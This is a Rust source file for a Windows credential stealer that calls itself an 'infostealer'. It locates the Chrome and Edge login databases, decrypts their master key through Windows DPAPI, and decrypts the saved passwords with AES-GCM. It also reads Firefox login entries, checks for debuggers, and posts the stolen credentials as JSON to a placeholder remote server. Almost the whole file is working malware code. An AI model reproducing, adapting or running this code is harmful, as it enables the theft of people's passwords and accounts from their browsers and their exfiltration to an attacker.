use std::fs;
use std::path::Path;
use std::path::PathBuf;
use reqwest::blocking::Client;
use serde::Serialize;
use rusqlite::{Connection, Result, params};
use std::time::Duration;
use std::thread;
use std::env;
use std::process::Command;
use std::io::{self, Write};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use std::ptr::null_mut;
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, NewAead};
use base64;
use log::{info, debug, warn, error};
use env_logger::Env;
use whoami;

#[derive(Serialize, Clone)]
struct StolenData {
    browser: String,
    url: String,
    username: String,
    password: String,
}

fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();

    info!("[INFO] Starting infostealer...");
    debug!("[DEBUG] Checking for debugger presence...");
    if is_debugger_present() {
        warn!("[ALERT] Debugger detected, exiting...");
        wait_for_user_input();
        return;
    }
    info!("[INFO] Debugger not detected. Proceeding with operation.");

    let username = whoami::username();
    let mut stolen_data = Vec::new();
    let chrome_path = format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", username);
    let edge_path = format!("C:\\Users\\{}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", username);
    let firefox_path = format!("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\logins.json", username);

    info!("\n[STEP 1] Checking browser paths");
    debug!("[DEBUG] Chrome path: {}", chrome_path);
    if Path::new(&chrome_path).exists() {
        info!("[INFO] Chrome path exists, grabbing logins...");
        stolen_data.extend(grab_chromium_logins(&chrome_path, "Chrome"));
    } else {
        warn!("[WARN] Chrome path does not exist.");
    }

    debug!("[DEBUG] Edge path: {}", edge_path);
    if Path::new(&edge_path).exists() {
        info!("[INFO] Edge path exists, grabbing logins...");
        stolen_data.extend(grab_chromium_logins(&edge_path, "Edge"));
    } else {
        warn!("[WARN] Edge path does not exist.");
    }

    debug!("[DEBUG] Firefox path: {}", firefox_path);
    if Path::new(&firefox_path).exists() {
        info!("[INFO] Firefox path exists, grabbing logins...");
        stolen_data.extend_from_slice(&grab_firefox_logins(&firefox_path));
    } else {
        warn!("[WARN] Firefox path does not exist.");
    }

    info!("\n[STEP 2] Serializing stolen data");
    let json_data = match serde_json::to_string(&stolen_data) {
        Ok(data) => {
            info!("[INFO] Data serialized successfully");
            debug!("[DEBUG] Serialized JSON data: {}", data);
            data
        }
        Err(e) => {
            error!("[ERROR] Failed to serialize data: {:?}", e);
            wait_for_user_input();
            return;
        }
    };

    info!("\n[STEP 3] Sending data to remote server");
    let server_url = "server_ip:port_here";
    debug!("[DEBUG] Server URL: {}", server_url);
    let client = Client::new();
    let response = client.post(server_url)
        .header("Content-Type", "application/json")
        .body(json_data)
        .send();

    match response {
        Ok(resp) => {
            info!("[INFO] Data sent successfully: {:?}", resp);
        }
        Err(e) => {
            error!("[ERROR] Failed to send data: {:?}", e);
        }
    }

    info!("\n[STEP 4] Obfuscation routine");
    for i in 0..5 {
        debug!("[DEBUG] Sleeping... iteration {}", i);
        thread::sleep(Duration::from_secs(1));
    }

    info!("\n[INFO] Infostealer operation completed.");
    wait_for_user_input();
}

fn grab_chromium_logins(path: &str, browser: &str) -> Vec<StolenData> {
    info!("[INFO] Grabbing {} logins from path: {}", browser, path);
    debug!("[DEBUG] Retrieving encryption key from local state file");
    let local_state_path = Path::new(path).parent().unwrap().parent().unwrap().join("Local State");
    debug!("[DEBUG] Local State path: {:?}", local_state_path);
    let encryption_key = match get_encryption_key(&local_state_path) {
        Ok(key) => {
            info!("[INFO] Encrypted key found in Local State file");
            debug!("[DEBUG] Base64 decoding encrypted key...");
            key
        }
        Err(e) => {
            error!("[ERROR] Failed to get encryption key: {:?}", e);
            return Vec::new();
        }
    };
    info!("[INFO] Encrypted key successfully retrieved");

    info!("\n[STEP 2] Decrypting master key using DPAPI");
    debug!("[DEBUG] Initializing DPAPI structures...");
    let master_key = match decrypt_dpapi(&encryption_key) {
        Ok(key) => {
            info!("[INFO] Calling CryptUnprotectData...");
            key
        }
        Err(e) => {
            error!("[ERROR] Failed to decrypt DPAPI data: {:?}", e);
            return Vec::new();
        }
    };
    debug!("[DEBUG] DPAPI decryption successful");
    info!("[INFO] Master key decrypted: {:02X?}...", &master_key[..4]);

    debug!("[DEBUG] Copying database to temporary location");
    let temp_path = PathBuf::from(format!("{}_copy", path));
    match fs::copy(path, &temp_path) {
        Ok(_) => info!("[INFO] Copied database to temporary location: {:?}", temp_path),
        Err(e) => {
            error!("[ERROR] Failed to copy database: {:?}", e);
            return Vec::new();
        }
    }

    debug!("[DEBUG] Opening SQLite connection...");
    let conn = match Connection::open(&temp_path) {
        Ok(conn) => {
            info!("[INFO] Successfully connected to login database");
            conn
        }
        Err(e) => {
            error!("[ERROR] Failed to open database: {:?}", e);
            return Vec::new();
        }
    };

    info!("\n[STEP 4] Retrieving encrypted passwords");
    debug!("[DEBUG] Executing SQL query: SELECT origin_url, username_value, password_value FROM logins");
    let data = {
        let mut stmt = match conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
            Ok(stmt) => stmt,
            Err(e) => {
                error!("[ERROR] Failed to prepare statement: {:?}", e);
                return Vec::new();
            }
        };

        let stolen_data_iter = match stmt.query_map(params![], |row| {
            let url: String = row.get(0)?;
            let username: String = row.get(1)?;
            let encrypted_password: Vec<u8> = row.get(2)?;
            let password = match decrypt_password(&encrypted_password, &master_key) {
                Ok(password) => password,
                Err(e) => {
                    error!("[ERROR] Failed to decrypt password: {:?}", e);
                    String::new()
                }
            };
            Ok(StolenData {
                browser: browser.to_string(),
                url,
                username,
                password,
            })
        }) {
            Ok(iter) => iter,
            Err(e) => {
                error!("[ERROR] Failed to execute query: {:?}", e);
                return Vec::new();
            }
        };

        stolen_data_iter.collect::<Result<Vec<_>, _>>().unwrap_or_else(|e| {
            error!("[ERROR] Failed to collect results: {:?}", e);
            Vec::new()
        })
    };

    info!("[INFO] Found {} login entries", data.len());

    info!("\n[STEP 5] Decrypting passwords using AES-GCM");
    for (i, entry) in data.iter().enumerate() {
        info!("[INFO] Decrypting password {} of {}...", i + 1, data.len());
        debug!("[DEBUG] Extracting nonce and ciphertext...");
    }
    debug!("[DEBUG] All passwords processed");

    info!("\n[STEP 6] Cleaning up temporary files");
    debug!("[DEBUG] Closing SQLite connection...");
    drop(conn);
    info!("[INFO] Deleting temporary database file...");
    if let Err(e) = fs::remove_file(&temp_path) {
        warn!("[WARN] Failed to remove temporary file: {:?}", e);
    } else {
        debug!("[DEBUG] Temporary file deleted successfully");
    }

    data
}

fn get_encryption_key(local_state_path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let local_state = fs::read_to_string(local_state_path)?;
    let json: serde_json::Value = serde_json::from_str(&local_state)?;
    let encrypted_key = base64::decode(json["os_crypt"]["encrypted_key"].as_str().ok_or("No encrypted_key")?)?;
    if !encrypted_key.starts_with(b"DPAPI") {
        return Err("Invalid encrypted key format".into());
    }
    let encrypted_key = &encrypted_key[5..];
    Ok(encrypted_key.to_vec())
}

fn decrypt_dpapi(encrypted: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut in_blob = DATA_BLOB {
        cbData: encrypted.len() as u32,
        pbData: encrypted.as_ptr() as *mut u8,
    };
    let mut out_blob = DATA_BLOB {
        cbData: 0,
        pbData: null_mut(),
    };
    let result = unsafe {
        CryptUnprotectData(
            &mut in_blob,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            &mut out_blob,
        )
    };
    if result == 0 {
        return Err("Failed to decrypt DPAPI data".into());
    }
    let decrypted_data = unsafe {
        std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec()
    };
    unsafe {
        winapi::um::winbase::LocalFree(out_blob.pbData as *mut _);
    }
    Ok(decrypted_data)
}

fn decrypt_password(encrypted_password: &[u8], encryption_key: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    if encrypted_password.len() < 15 {
        return Err("Invalid encrypted password length".into());
    }
    if &encrypted_password[..3] != b"v10" {
        return Err("Unsupported password version".into());
    }
    let nonce = &encrypted_password[3..15];
    let ciphertext = &encrypted_password[15..];
    let key = Key::from_slice(encryption_key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);
    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("Decryption error: {:?}", e))?;
    String::from_utf8(plaintext).map_err(|e| e.into())
}

fn grab_firefox_logins(path: &str) -> Vec<StolenData> {
    info!("[INFO] Grabbing Firefox logins from path: {}", path);
    let mut data = Vec::new();
    let file_content = match fs::read_to_string(path) {
        Ok(content) => content,
        Err(e) => {
            error!("[ERROR] Failed to read file: {:?}", e);
            return Vec::new();
        }
    };
    let json: serde_json::Value = match serde_json::from_str(&file_content) {
        Ok(json) => json,
        Err(e) => {
            error!("[ERROR] Failed to parse JSON: {:?}", e);
            return Vec::new();
        }
    };
    if let Some(logins) = json["logins"].as_array() {
        for login in logins {
            let url = login["hostname"].as_str().unwrap_or("").to_string();
            let username = login["encryptedUsername"].as_str().unwrap_or("").to_string();
            let password = login["encryptedPassword"].as_str().unwrap_or("").to_string();
            data.push(StolenData {
                browser: "Firefox".to_string(),
                url,
                username,
                password,
            });
        }
    }
    info!("[INFO] Collected {} logins from Firefox", data.len());
    data
}

fn is_debugger_present() -> bool {
    let is_debugger = env::var("IS_DEBUGGER").unwrap_or("0".to_string()) == "1";
    if is_debugger {
        return true;
    }
    let output = match Command::new("tasklist").output() {
        Ok(output) => output,
        Err(e) => {
            error!("[ERROR] Failed to execute tasklist command: {:?}", e);
            return false;
        }
    };
    let output_str = String::from_utf8_lossy(&output.stdout);
    if output_str.contains("ollydbg.exe") || output_str.contains("x64dbg.exe") || output_str.contains("windbg.exe") {
        return true;
    }
    false
}

fn wait_for_user_input() {
    println!("Press Enter to exit...");
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
}
